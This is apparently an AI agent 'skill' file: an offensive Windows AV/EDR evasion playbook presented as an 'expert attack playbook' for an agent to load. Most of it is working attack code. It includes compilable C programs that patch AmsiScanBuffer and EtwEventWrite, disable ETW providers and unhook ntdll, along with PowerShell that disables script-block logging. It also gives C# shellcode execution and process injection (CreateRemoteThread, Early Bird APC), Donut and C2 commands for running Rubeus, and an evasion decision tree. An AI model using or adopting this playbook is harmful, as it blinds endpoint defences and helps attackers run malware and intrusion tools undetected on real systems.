---
name: windows-av-evasion
description: >-
  AV/EDR evasion playbook for Windows. Use when bypassing AMSI, ETW, .NET assembly detection, shellcode execution, process injection, API hooking, and signature-based detection on Windows endpoints.
---

# SKILL: AV/EDR Evasion — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert AV/EDR evasion techniques for Windows. Covers AMSI bypass, ETW bypass, .NET assembly loading, shellcode execution, process injection, unhooking, payload encryption, and signature evasion. Base models miss detection-specific bypass chains and syscall-level evasion nuances.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) when privesc tools are blocked by AV
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) when lateral movement tools trigger EDR
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) when Rubeus/Mimikatz are detected
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for non-binary AD attacks (less AV-sensitive)

### Advanced Reference

Also load [AMSI_BYPASS_TECHNIQUES.md](./AMSI_BYPASS_TECHNIQUES.md) when you need:
- Detailed AMSI bypass code patterns (memory patching, reflection)
- PowerShell-specific AMSI bypasses
- .NET AMSI bypass techniques

---

## 1. AMSI BYPASS OVERVIEW

AMSI (Antimalware Scan Interface) inspects PowerShell, .NET, VBScript, JScript, and Office macros at runtime.

### Key AMSI Bypass Categories

| Category | Method | Detection Risk | Persistence |
|---|---|---|---|
| Memory patching | Patch `AmsiScanBuffer` in `amsi.dll` | Medium | Per-process |
| Reflection | Modify AMSI init flags via .NET reflection | Medium | Per-session |
| String obfuscation | Encode/split AMSI trigger strings | Low | Per-payload |
| PowerShell downgrade | Force PS v2 (no AMSI) | Low | Per-session |
| CLM bypass | Escape Constrained Language Mode | Medium | Per-session |
| COM hijack | Redirect AMSI COM server | Low | Per-user |

### Quick AMSI Bypass (One-Liners)

```powershell
# PowerShell v2 downgrade (if .NET 2.0 available — no AMSI in v2)
powershell -Version 2

# Reflection-based (set amsiInitFailed = true)
# Obfuscated to avoid static detection — see AMSI_BYPASS_TECHNIQUES.md for full patterns
```

### C Language AMSI Patch (Complete Implementation)

```c
/**
 * 完整 C 语言 AMSI 绕过 — Patch AmsiScanBuffer 返回 E_INVALIDARG
 * 编译: x86_64-w64-mingw32-gcc -O2 patch_amsi.c -o patch_amsi.exe
 *
 * 原理: patching amsi.dll!AmsiScanBuffer 的前几个字节，
 *       使其直接返回 0x80070057 (E_INVALIDARG)，
 *       AMSI 调用方收到该返回值后会跳过扫描。
 */

#include <windows.h>
#include <stdio.h>

BOOL PatchAmsiScanBuffer() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        printf("[-] LoadLibrary(amsi.dll) failed\n");
        return FALSE;
    }

    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        printf("[-] GetProcAddress(AmsiScanBuffer) failed\n");
        return FALSE;
    }

    printf("[+] AmsiScanBuffer @ 0x%p\n", pAmsiScanBuffer);

    DWORD oldProtect = 0;
    SIZE_T patchSize = 6; // x64: 6 bytes

#ifdef _WIN64
    // x64: mov eax, 0x80070057; ret
    //     B8 57 00 07 80    mov eax, 0x80070057
    //     C3                ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
#else
    // x86: mov eax, 0x80070057; ret 0x18
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
    patchSize = 8;
#endif

    if (!VirtualProtect(pAmsiScanBuffer, patchSize,
                         PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
        return FALSE;
    }

    memcpy(pAmsiScanBuffer, patch, patchSize);

    DWORD dummy;
    VirtualProtect(pAmsiScanBuffer, patchSize, oldProtect, &dummy);

    printf("[+] AmsiScanBuffer patched successfully\n");
    return TRUE;
}

// 验证: 调用后 PowerShell 的 AMSI 扫描将全部返回 AMSI_RESULT_CLEAN
```

### Patchless AMSI Bypass（硬件断点 — 最高级别无痕）

2025-2026年最高级的用户态绕过方案，完全不修改任何内存字节：

```c
/**
 * 使用硬件断点（DR0）+ VEH 实现无痕 AMSI 绕过
 * - 在 AmsiScanBuffer 入口设置硬件断点
 * - VEH 处理器捕获断点异常后修改 RAX = E_INVALIDARG
 * - 跳过函数体执行，直接返回
 * - 全程不修改任何内存字节，不调用 VirtualProtect
 * - EDR 内存完整性检测无法发现
 */
// 详细实现见 advanced-process-injection skill 的 Sleep Obfuscation 章节
// 或参考 KazuLoader v3 (Turla APT) 的硬件断点技术方案
```

**C# / PowerShell 版本** — 见 `AMSI_BYPASS_TECHNIQUES.md`

---

## 2. ETW BYPASS

ETW (Event Tracing for Windows) 向 EDR/SIEM 上报 .NET 程序集加载、PowerShell 脚本块、进程创建等遥测数据。**仅绕过 AMSI 不够，必须同时处理 ETW。**

### 2.1 Patch EtwEventWrite（C 语言完整实现）

```c
/**
 * 完整 C 语言 ETW 绕过 — Patch ntdll!EtwEventWrite
 * 将所有用户态 ETW 事件静默丢弃
 * 编译: x86_64-w64-mingw32-gcc -O2 patch_etw.c -o patch_etw.exe
 */

#include <windows.h>
#include <stdio.h>

BOOL PatchEtwEventWrite() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) {
        printf("[-] GetProcAddress(EtwEventWrite) failed\n");
        return FALSE;
    }

    printf("[+] EtwEventWrite @ 0x%p\n", pEtwEventWrite);

    DWORD oldProtect = 0;

    if (!VirtualProtect(pEtwEventWrite, 1,
                         PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    // 写入单字节 RET (0xC3)，函数立即返回而不上报任何事件
    *(BYTE *)pEtwEventWrite = 0xC3;

    DWORD dummy;
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &dummy);

    printf("[+] EtwEventWrite patched — all user-mode ETW events suppressed\n");
    return TRUE;
}

// 同样可以 patch EtwEventWriteFull（更完整的 ETW 写入路径）:
// GetProcAddress(hNtdll, "EtwEventWriteFull") → 同样写入 0xC3
```

### 2.2 ETW 深度绕过（2025-2026 对抗升级）

> **背景**: Windows 11 24H2 新增了 `Microsoft-Windows-Threat-Intelligence` ETW Provider，通过独立安全通道传输，不经过用户态可 patch 的 EtwEventWrite 路径。仅 patch EtwEventWrite 无法阻止 Threat Intel 事件上报。

#### 2.2.1 ETW Provider 级选择性禁用

```c
/**
 * 使用 NtTraceControl 禁用特定 ETW Provider
 * 比全局 patch EtwEventWrite 更隐蔽 — 只影响目标 Provider
 * 需要 SeSystemProfilePrivilege 或管理员权限
 *
 * 关键 Provider GUID:
 * - Microsoft-Windows-Threat-Intelligence: {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
 * - Microsoft-Windows-DotNETRuntime:      {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}
 * - Microsoft-Windows-PowerShell:         {A0C1853B-5C40-4B15-8766-3CF1C58F985A}
 * - Microsoft-Windows-Kernel-Process:     {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}
 */

#ifndef EVENT_TRACE_CONTROL_DISABLE_PROVIDER
#define EVENT_TRACE_CONTROL_DISABLE_PROVIDER 5
#endif

typedef NTSTATUS (NTAPI *pNtTraceControl)(
    ULONG FunctionCode, PVOID InBuffer, ULONG InBufferLen,
    PVOID OutBuffer, ULONG OutBufferLen, PULONG BytesReturned
);

BOOL DisableETWProvider(LPCGUID providerGuid) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtTraceControl fnNtTraceControl =
        (pNtTraceControl)GetProcAddress(hNtdll, "NtTraceControl");

    if (!fnNtTraceControl) return FALSE;

    // FunctionCode = 5 → DisableProvider
    NTSTATUS status = fnNtTraceControl(
        EVENT_TRACE_CONTROL_DISABLE_PROVIDER,
        (PVOID)providerGuid, sizeof(GUID),
        NULL, 0, NULL
    );

    return (status == 0);
}

// 使用: DisableETWProvider(&ThreatIntelProviderGuid);
```

#### 2.2.2 ETW Session 操作 — EtwNotificationUnregister

```c
/**
 * 通过 EtwNotificationUnregister 移除已注册的 ETW 通知回调
 * 这比 patch EtwEventWrite 更根本 — 从根源上取消事件订阅
 *
 * 原理: EDR 通过 EtwRegister/EtwNotificationRegister 注册事件回调。
 *       EtwNotificationUnregister 可以移除这些回调。
 *       需要知道 EDR 注册时使用的 NotificationHandle。
 *
 * 注意: 此方法需要逆向 EDR 进程获取 NotificationHandle，
 *       不如 Provider 禁用方案实用。列为高级参考。
 */
```

#### 2.2.3 PowerShell ETW 禁用（脚本层）

```powershell
# 方法 1: 反射禁用 Script Block Logging
$settings = [Ref].Assembly.GetType(
    'System.Management.Automation.Utils'
).GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$settings.SetValue($null, [PSObject].new())

# 方法 2: 禁用 ETW 会话（需要管理员权限）
logman stop "Microsoft-Windows-PowerShell/Operational" -ets 2>$null
logman stop "EventLog-Microsoft-Windows-PowerShell/Operational" -ets 2>$null
```

#### 2.2.4 ETW 绕过方案速查

| 方案 | 覆盖范围 | 检测风险 | 适用场景 |
|---|---|---|---|
| **Patch EtwEventWrite** (§2.1) | 所有用户态 ETW 事件 | 中（内存完整性检测） | 通用首选 |
| **Provider 选择性禁用** (§2.2.1) | 目标 Provider 事件 | 低（无内存修改） | 需精确控制的事件类型 |
| **EtwNotificationUnregister** (§2.2.2) | 目标会话 | 高（需逆向 EDR） | 高级定制场景 |
| **PS 反射禁用** (§2.2.3) | PowerShell 日志 | 低 | 仅 PS 脚本场景 |
| **Patch EtwEventWriteFull** | 完整 ETW 写入路径 | 中 | 配合 EtwEventWrite 双杀 |

---

## 3. .NET ASSEMBLY LOADING

### In-Memory Assembly.Load

```csharp
byte[] assemblyBytes = File.ReadAllBytes("tool.exe");
// Or download from URL, decrypt from resource
Assembly assembly = Assembly.Load(assemblyBytes);
assembly.EntryPoint.Invoke(null, new object[] { args });
```

### Donut — Convert .NET Assembly to Shellcode

```bash
# Generate shellcode from .NET EXE
donut -f tool.exe -o payload.bin -a 2 -c ToolNamespace.Program -m Main

# With parameters
donut -f Rubeus.exe -o rubeus.bin -a 2 -p "kerberoast /outfile:tgs.txt"

# Then load shellcode via any injection technique (§5)
```

### execute-assembly (C2 Framework)

```
# Cobalt Strike
execute-assembly /path/to/Rubeus.exe kerberoast

# Sliver
execute-assembly /path/to/SharpHound.exe -c all

# Havoc
dotnet inline-execute /path/to/tool.exe args
```

---

## 4. SHELLCODE EXECUTION TECHNIQUES

### VirtualAlloc + Callback (Avoids CreateThread)

```csharp
IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
Marshal.Copy(sc, 0, addr, sc.Length);
// Use callback API instead of CreateThread (less monitored)
EnumWindows(addr, IntPtr.Zero);
```

**Callback APIs for shellcode execution**: `EnumWindows`, `EnumChildWindows`, `EnumFonts`, `EnumDesktops`, `CertEnumSystemStore`, `EnumDateFormats` — all accept function pointers that can point to shellcode.

---

## 5. PROCESS INJECTION TECHNIQUES

| Technique | APIs Used | Detection Risk | Notes |
|---|---|---|---|
| **CreateRemoteThread** | OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread | High | Classic, heavily monitored |
| **NtMapViewOfSection** | NtCreateSection, NtMapViewOfSection | Medium | Shared memory, less common |
| **Process Hollowing** | CreateProcess (SUSPENDED), NtUnmapViewOfSection, WriteProcessMemory, ResumeThread | Medium | Replace process image |
| **Thread Hijacking** | SuspendThread, SetThreadContext, ResumeThread | Medium | Modify existing thread |
| **Early Bird** | CreateProcess (SUSPENDED), QueueUserAPC, ResumeThread | Low-Medium | APC before main thread |
| **Phantom DLL Hollowing** | Map DLL section, overwrite with shellcode | Low | Uses legitimate DLL mapping |
| **Module Stomping** | LoadLibrary, overwrite .text section | Low | Backed by legitimate DLL |
| **Transacted Hollowing** | NtCreateTransaction, NtCreateSection | Low | No suspicious allocations |

### CreateRemoteThread (Basic Pattern)

```csharp
IntPtr hProcess = OpenProcess(0x001F0FFF, false, targetPid);
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
WriteProcessMemory(hProcess, addr, sc, (uint)sc.Length, out _);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

### Early Bird APC Injection

```csharp
// Create suspended process
STARTUPINFO si = new STARTUPINFO();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ..., ref si, ref pi);

// Allocate and write shellcode
IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
WriteProcessMemory(pi.hProcess, addr, sc, (uint)sc.Length, out _);

// Queue APC to main thread (runs before main entry point)
QueueUserAPC(addr, pi.hThread, IntPtr.Zero);
ResumeThread(pi.hThread);
```

---

## 6. UNHOOKING — BYPASS EDR API HOOKS

### Direct Syscalls (SysWhispers / HellsGate)

EDR hooks `ntdll.dll` functions. Direct syscalls bypass hooks by invoking the kernel directly.

```
Normal: User code → ntdll.dll (HOOKED) → kernel
Direct: User code → syscall instruction → kernel (bypasses hook)
```

| Tool | Method | Notes |
|---|---|---|
| **SysWhispers2/3** | Compile-time syscall stubs | Static syscall numbers |
| **HellsGate** | Runtime syscall number resolution | Dynamic, harder to detect |
| **HalosGate** | Resolve from neighboring unhooked syscalls | Handles partial hooks |
| **TartarusGate** | Extended HalosGate | More robust resolution |

### Fresh ntdll Copy（完整 C 实现）

```c
/**
 * 从磁盘 KnownDlls 读取干净 ntdll.dll 并覆盖内存中被 Hook 的 .text 段
 * 编译: x86_64-w64-mingw32-gcc -O2 unhook_ntdll.c -o unhook_ntdll.exe
 *
 * 原理: EDR 通过修改内存中的 ntdll.dll .text 段来 Hook 系统调用。
 *       从磁盘读取干净的 ntdll.dll，将其 .text 段覆盖回内存，
 *       彻底清除所有用户态 Hook。
 *
 * 关键: 必须从 \\KnownDlls\\ 读取（而非 System32），
 *       KnownDlls 是内核维护的内存映射，EDR 无法修改。
 */

#include <windows.h>
#include <stdio.h>

/**
 * 获取当前进程 ntdll.dll 的模块信息
 * 通过 PEB 遍历 LDR 链表 — 不依赖任何 Hook 敏感 API
 */
HMODULE GetNtdllBase() {
    // x64: 通过 GS 段寄存器偏移 0x60 获取 PEB
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA pLdr = pPeb->Ldr;

    // 遍历 InMemoryOrderModuleList
    PLIST_ENTRY head = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY pEntry =
            CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY,
                              InMemoryOrderLinks);

        // 检查模块名是否为 ntdll.dll
        if (pEntry->BaseDllName.Length > 0) {
            WCHAR *name = pEntry->BaseDllName.Buffer;
            if (_wcsicmp(name, L"ntdll.dll") == 0) {
                return (HMODULE)pEntry->DllBase;
            }
        }
        entry = entry->Flink;
    }
    return NULL;
}

BOOL UnhookNtdll() {
    // 1. 获取当前进程中的 ntdll 基址
    HMODULE hNtdll = GetNtdllBase();
    if (!hNtdll) {
        printf("[-] GetNtdllBase() failed\n");
        return FALSE;
    }
    printf("[+] ntdll.dll base @ 0x%p\n", hNtdll);

    // 2. 从 \KnownDlls\ntdll.dll 读取干净副本
    //    KnownDlls 是内核维护的 Section 对象，EDR 无法修改
    HANDLE hFile = CreateFileA(
        "\\\\.\\GLOBALROOT\\KnownDlls\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        // 回退到 System32（如果 KnownDlls 不可用）
        hFile = CreateFileA(
            "C:\\Windows\\System32\\ntdll.dll",
            GENERIC_READ, FILE_SHARE_READ, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
        );
    }

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open ntdll.dll: %lu\n", GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE *cleanNtdll = (BYTE *)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize
    );

    DWORD bytesRead;
    ReadFile(hFile, cleanNtdll, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    printf("[+] Loaded clean ntdll.dll: %lu bytes\n", fileSize);

    // 3. 手动解析 PE 头，定位 .text 段
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(cleanNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    LPVOID textAddr = NULL;
    DWORD textSize = 0;
    LPVOID textRawData = NULL;
    DWORD textRawSize = 0;

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSec[i].Name, ".text", 5) == 0) {
            textAddr = (LPVOID)((UINT_PTR)hNtdll + pSec[i].VirtualAddress);
            textSize = pSec[i].Misc.VirtualSize;
            textRawData = cleanNtdll + pSec[i].PointerToRawData;
            textRawSize = pSec[i].SizeOfRawData;
            break;
        }
    }

    if (!textAddr || !textRawData) {
        printf("[-] .text section not found\n");
        HeapFree(GetProcessHeap(), 0, cleanNtdll);
        return FALSE;
    }

    printf("[+] .text section: VA=0x%p, Size=0x%lx\n",
           textAddr, textSize);

    // 4. 覆盖内存中的 .text 段为干净版本
    DWORD oldProtect;
    if (!VirtualProtect(textAddr, textSize,
                         PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, cleanNtdll);
        return FALSE;
    }

    memcpy(textAddr, textRawData, textRawSize);

    DWORD dummy;
    VirtualProtect(textAddr, textSize, oldProtect, &dummy);

    printf("[+] ntdll.dll .text section restored — all EDR hooks removed\n");

    HeapFree(GetProcessHeap(), 0, cleanNtdll);
    return TRUE;
}

// 使用:
// int main() {
//     UnhookNtdll();
//     // 此时所有 ntdll 函数已恢复为原始版本
//     // 后续所有通过 ntdll 的系统调用不再经过 EDR Hook
//     ...
// }
```

**验证 Unhooking 是否成功**:
```c
// Patch 完成后，查看 NtAllocateVirtualMemory 的前 4 字节
// 原始版本: 4C 8B D1 B8 (mov r10, rcx; mov eax, SSN)
// Hook 版本: 通常包含 E9 (JMP) 或 FF 25 (JMP [mem])
BYTE *pNtAlloc = GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                "NtAllocateVirtualMemory");
printf("NtAllocateVirtualMemory entry: %02X %02X %02X %02X\n",
       pNtAlloc[0], pNtAlloc[1], pNtAlloc[2], pNtAlloc[3]);
// 如果输出 4C 8B D1 B8 → Unhooking 成功
```

### Indirect Syscalls

```
// Instead of: syscall (in your code — suspicious)
// Do: jump to syscall instruction inside ntdll.dll (legitimate location)
// The ret address on stack points to ntdll.dll, not your code
```

---

## 7. PAYLOAD ENCRYPTION & OBFUSCATION

### Encryption Methods

```csharp
// AES encryption (preferred)
using Aes aes = Aes.Create();
aes.Key = key; aes.IV = iv;
byte[] encrypted = aes.CreateEncryptor().TransformFinalBlock(shellcode, 0, shellcode.Length);

// XOR (simple, fast)
for (int i = 0; i < shellcode.Length; i++)
    shellcode[i] ^= key[i % key.Length];

// RC4 (stream cipher, simple implementation)
```

### Sleep Obfuscation

Encrypt shellcode in memory during sleep to avoid memory scanners.

| Technique | Method |
|---|---|
| **Ekko** | ROP chain → encrypt heap/stack during sleep |
| **Foliage** | APC-based sleep with memory encryption |
| **DeathSleep** | Thread de-registration during sleep |

### Staged Loading

```
Stage 1: Small, encrypted loader (evades static analysis)
Stage 2: Download actual payload at runtime (encrypted)
Stage 3: Decrypt in memory → execute
```

---

## 8. SIGNATURE EVASION

### String Encryption

```csharp
// Avoid plaintext API names, URLs, tool names
// Use encrypted strings, decrypt at runtime
string decrypted = Decrypt(encryptedApiName);
IntPtr funcPtr = GetProcAddress(GetModuleHandle("kernel32.dll"), decrypted);
```

### API Hashing

```csharp
// Resolve API by hash instead of name (avoids string detection)
// Hash "VirtualAlloc" → 0x91AFCA54
IntPtr func = GetProcAddressByHash(module, 0x91AFCA54);
```

### Metadata Removal

```bash
# Strip .NET metadata
ConfuserEx / .NET Reactor / Obfuscar

# Remove PE metadata (timestamps, rich header, debug info)
# Modify compilation timestamps
# Strip PDB paths
```

### C2 Framework Evasion

| Framework | Key Evasion Features |
|---|---|
| **Cobalt Strike** | Malleable C2 profiles, HTTP/S traffic shaping, sleep jitter, PE evasion |
| **Sliver** | Multiple protocols (mTLS, WireGuard, DNS), stager-less, built-in obfuscation |
| **Havoc** | Indirect syscalls, sleep obfuscation, module stomping |
| **Brute Ratel** | Badger agent, syscall evasion, ETW/AMSI bypass built-in |

---

## 9. AV/EDR EVASION DECISION TREE

```
Need to execute tool/payload on protected host
│
├── PowerShell-based payload?
│   ├── AMSI blocking? → AMSI bypass first (§1)
│   │   ├── .NET 2.0 available? → PS v2 downgrade (no AMSI)
│   │   ├── Memory patch AmsiScanBuffer
│   │   └── Reflection-based bypass
│   ├── Script Block Logging? → ETW bypass (§2)
│   └── Constrained Language Mode? → CLM bypass or switch to C#
│
├── .NET assembly (Rubeus, SharpHound, etc.)?
│   ├── Direct execution blocked?
│   │   ├── In-memory Assembly.Load (§3)
│   │   ├── Convert to shellcode with Donut (§3)
│   │   └── Use C2 execute-assembly (§3)
│   └── Still detected?
│       ├── Obfuscate assembly (ConfuserEx)
│       ├── Modify source + recompile
│       └── Use BOFs (Beacon Object Files) if CS
│
├── Shellcode execution needed?
│   ├── Basic → VirtualAlloc + callback (§4)
│   ├── Need injection → choose technique by OPSEC (§5)
│   │   ├── Low detection needed → module stomping or phantom DLL
│   │   ├── Medium → early bird APC or NtMapViewOfSection
│   │   └── Quick and dirty → CreateRemoteThread
│   └── Memory scanners detect payload?
│       ├── Encrypt payload → decrypt only at execution (§7)
│       └── Sleep obfuscation (Ekko/Foliage) (§7)
│
├── EDR hooking ntdll.dll?
│   ├── Direct syscalls (SysWhispers3/HellsGate) (§6)
│   ├── Fresh ntdll copy from disk/KnownDlls (§6)
│   └── Indirect syscalls (return to ntdll instruction) (§6)
│
├── Signature detection?
│   ├── Known tool signature → modify + recompile
│   ├── String-based → string encryption / API hashing (§8)
│   ├── PE metadata → strip/modify (§8)
│   └── Behavioral → change execution flow, add junk code
│
└── All local evasion fails?
    ├── Use Living-off-the-Land (LOLBins): certutil, mshta, regsvr32
    ├── Use legitimate admin tools (PsExec, WMI, WinRM)
    └── Switch to fileless / memory-only techniques
```
